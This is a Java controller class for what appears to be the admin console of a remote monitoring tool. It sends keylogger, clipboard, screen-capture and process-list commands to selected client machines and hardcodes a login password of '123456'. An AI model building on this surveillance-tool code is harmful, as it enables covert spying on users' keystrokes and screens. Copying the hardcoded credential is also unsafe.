package controllers;

import admin.Admin;
import controllers.base.ProduceExecutable;
import models.MessageModel;
import models.SystemInfoModel;

import java.util.HashMap;
import java.util.Map;

import static utils.Command.*;
import static utils.Command.COMMAND_PROCESS;
import static utils.Environment.DEFAULT_SERVER_HOST;

public class ProduceController {
    private static Map<String, ProduceExecutable<Admin>> controller = new HashMap();

    public static void init() {
        put(COMMAND_LOGIN, ProduceController::login);
        put(COMMAND_GET_ALL_CLIENTS, ProduceController::getClients);
        put(COMMAND_BROADCAST, ProduceController::getBroadcast);
        put(COMMAND_MONITORING, ProduceController::getMonitoring);
        put(COMMAND_CLIPBOARD, ProduceController::getClipboard);
        put(COMMAND_KEYLOGGER, ProduceController::getKeylogger);
        put(COMMAND_CLIENT_SCREEN, ProduceController::getScreen);
        put(COMMAND_PROCESS, ProduceController::getProcess);
    }

    private static String getProcess(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_PROCESS).json();
    }

    private static String getScreen(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIENT_SCREEN).json();
    }

    private static String getMonitoring(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_MONITORING).json();
    }

    private static String getClipboard(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_CLIPBOARD).json();
    }

    private static String getKeylogger(Admin admin) {
        return new MessageModel(DEFAULT_FROM, Admin.getGui().getCurrentClientId(), COMMAND_KEYLOGGER).json();
    }

    private static String getClients(Admin admin) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
                .put(COMMAND, COMMAND_GET_ALL_CLIENTS)
                .json();
    }

    private static String login(Admin admin) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
                .put("command", "/login")
                .put("username", "DEFAULT_FROM")
                .put("password", "123456")
                .json();
    }

    private static String getBroadcast(Admin admin) {
        return new MessageModel(DEFAULT_FROM, DEFAULT_SERVER_HOST)
                .put(COMMAND, COMMAND_BROADCAST)
                .put("message", "hello world!")
                .json();
    }

    private static String getNotFoundController(Admin obj) throws Exception {
        throw new Exception("Invalid Command");
    }

    public static ProduceExecutable get(String key) {
        return controller.getOrDefault(key, ProduceController::getNotFoundController);
    }

    public static ProduceExecutable put(String key, ProduceExecutable<Admin> value) {
        return controller.put(key, value);
    }

    public static void main(String[] args) throws InterruptedException {
//        String tmp1 = System.getenv("PROCESSOR_IDENTIFIER");
//        String tmp2 = System.getenv("PROCESSOR_ARCHITECTURE");
//        String tmp3 = System.getenv("PROCESSOR_ARCHITEW6432");
//        String tmp4 = System.getenv("NUMBER_OF_PROCESSORS");
//        com.sun.management.OperatingSystemMXBean osBean = (com.sun.management.OperatingSystemMXBean) ManagementFactory.getPlatformMXBean(OperatingSystemMXBean.class);
//        while (true) {
////            System.out.println(osBean.getProcessCpuLoad() * 100);
//            System.out.println(oeeeesBean.getSystemCpuLoad()  * 100);
//e
//            Thread.sleep(1000);
//        }
//        System.out.println((osBean.getTotalPhysicalMemorySize()/1073741824)+"");
//        System.out.println((osBean.getFreePhysicalMemorySize()/1073741824)+"");

//        console.log(String.valueOf(new File("C:/").getFreeSpace() / (1024 * 1024 * 1024)));

//        System.getenv().forEach((e,v)->{
//            console.log(e+ " | " +v);
//        });
//        console.log( );
//        console.log(tmp2 );
//        console.log(tmp3 );
//        console.log(tmp4 );
//        File[] paths;
//        FileSystemView fsv = FileSystemView.getFileSystemView();
//
//// returns pathnames for files and directory
//        paths = File.listRoots();
//
//// for each pathname in pathname array
//        for(File path : paths)
//        {
//            // prints file and directory paths
//            System.out.println("Drive Name: "+path);
//            System.out.println("Description: "+ path.getFreeSpace() / (1024 * 1024 * 1024));
//            System.out.println("TOTAL: "+ path.getTotalSpace() / (1024 * 1024 * 1024));
//        }
//        Properties p = System.getProperties();
//        p.list(System.out);
//        System.out.print("Total CPU:");
//        System.out.println(Runtime.getRuntime().availableProcessors());
//        System.out.println("Max Memory:" + (Runtime.getRuntime().maxMemory() / 1073741824) + "\n" + "available Memory:" + Runtime.getRuntime().freeMemory());
//        System.out.println("os.name=" + System.getProperty("os.name"));

    }
}
